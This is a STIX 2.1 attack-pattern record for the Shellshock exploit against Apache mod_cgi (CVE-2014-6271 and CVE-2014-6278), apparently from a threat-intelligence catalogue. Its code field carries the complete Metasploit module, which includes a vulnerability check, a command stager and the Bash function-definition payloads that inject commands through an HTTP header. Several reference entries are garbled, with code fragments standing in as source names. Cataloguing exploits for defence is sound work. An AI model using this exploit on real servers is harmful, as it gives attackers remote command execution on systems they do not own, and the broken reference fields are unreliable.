{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0a6743b8-a163-4bfe-8e84-f0e171deced3",
    "created": "2024-08-14T17:11:40.112681Z",
    "modified": "2024-08-14T17:11:40.112685Z",
    "name": "Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)",
    "description": " This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets CGI scripts in the Apache web server by setting the HTTP_USER_AGENT environment variable to a malicious function definition. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apache_mod_cgi_bash_env_exec.rb",
            "external_id": "apache_mod_cgi_bash_env_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6271"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6278"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/articles/1200223"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2014/q3/649"
        },
        {
            "source_name": "res=req(\"echo#{marker}\"",
            "external_id": "datastoreCVE)"
        },
        {
            "source_name": "req(\"#{stager_instance.instance_variable_get(\"@tempdir\")}#{stager_instance.instance_variable_get(\"@var_elf\")}\"",
            "external_id": "datastoreCVE)"
        },
        {
            "source_name": "req(cmd",
            "external_id": "datastoreCVE)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)',\n      'Description' => %q{\n        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell\n        handles external environment variables. This module targets CGI scripts in the\n        Apache web server by setting the HTTP_USER_AGENT environment variable to a\n        malicious function definition.\n      },\n      'Author' => [\n        'Stephane Chazelas', # Vulnerability discovery\n        'wvu', # Original Metasploit aux module\n        'juan vazquez', # Allow wvu's module to get native sessions\n        'lcamtuf' # CVE-2014-6278\n      ],\n      'References' => [\n        [ 'CVE', '2014-6271' ],\n        [ 'CVE', '2014-6278' ],\n        [ 'CWE', '94' ],\n        [ 'OSVDB', '112004' ],\n        [ 'EDB', '34765' ],\n        [ 'URL', 'https://access.redhat.com/articles/1200223' ],\n        [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ]\n      ],\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 2048\n        },\n      'Targets'        =>\n        [\n          [ 'Linux x86',\n            {\n              'Platform'        => 'linux',\n              'Arch'            => ARCH_X86,\n              'CmdStagerFlavor' => [ :echo, :printf ]\n            }\n          ],\n          [ 'Linux x86_64',\n            {\n              'Platform'        => 'linux',\n              'Arch'            => ARCH_X64,\n              'CmdStagerFlavor' => [ :echo, :printf ]\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2014-09-24',\n      'License' => MSF_LICENSE,\n      'Notes' =>\n          {\n            'Stability' => [CRASH_SAFE],\n            'SideEffects' => [],\n            'Reliability' => [],\n            'AKA' => ['Shellshock']\n          }\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to CGI script']),\n      OptString.new('METHOD', [true, 'HTTP method to use', 'GET']),\n      OptString.new('HEADER', [true, 'HTTP header to use', 'User-Agent']),\n      OptInt.new('CMD_MAX_LENGTH', [true, 'CMD max line length', 2048]),\n      OptString.new('RPATH', [true, 'Target PATH for binaries used by the CmdStager', '/bin']),\n      OptInt.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 5]),\n      OptEnum.new('CVE', [true, 'CVE to check/exploit', 'CVE-2014-6271', ['CVE-2014-6271', 'CVE-2014-6278']])\n    ])\n  end\n\n  def check\n    res = req(\"echo #{marker}\", datastore['CVE'])\n\n    if res && res.body.include?(marker * 3)\n      return Exploit::CheckCode::Vulnerable\n    elsif res && res.code == 500\n      injected_res_code = res.code\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    res = send_request_cgi({\n      'method' => datastore['METHOD'],\n      'uri' => normalize_uri(target_uri.path.to_s)\n    })\n\n    if res && injected_res_code == res.code\n      return Exploit::CheckCode::Unknown\n    elsif res && injected_res_code != res.code\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    execute_cmdstager(:linemax => datastore['CMD_MAX_LENGTH'], :nodelete => true)\n\n    # A last chance after the cmdstager\n    # Trying to make it generic\n    unless session_created?\n      req(\"#{stager_instance.instance_variable_get(\"@tempdir\")}#{stager_instance.instance_variable_get(\"@var_elf\")}\", datastore['CVE'])\n    end\n  end\n\n  def execute_command(cmd, opts)\n    cmd.gsub!('chmod', \"#{datastore['RPATH']}/chmod\")\n\n    req(cmd, datastore['CVE'])\n  end\n\n  def req(cmd, cve)\n    case cve\n    when 'CVE-2014-6271'\n      sploit = cve_2014_6271(cmd)\n    when 'CVE-2014-6278'\n      sploit = cve_2014_6278(cmd)\n    end\n\n    send_request_cgi(\n      {\n        'method' => datastore['METHOD'],\n        'uri' => normalize_uri(target_uri.path.to_s),\n        'headers' => {\n          datastore['HEADER'] => sploit\n        }\n      }, datastore['TIMEOUT'])\n  end\n\n  def cve_2014_6271(cmd)\n    %Q{() { :;};echo -e \"\\\\r\\\\n#{marker}$(#{cmd})#{marker}\"}\n  end\n\n  def cve_2014_6278(cmd)\n    %Q{() { _; } >_[$($())] { echo -e \"\\\\r\\\\n#{marker}$(#{cmd})#{marker}\"; }}\n  end\n\n  def marker\n    @marker ||= rand_text_alphanumeric(rand(42) + 1)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-24",
    "x_mitre_platforms": [
        "linux'"
    ]
}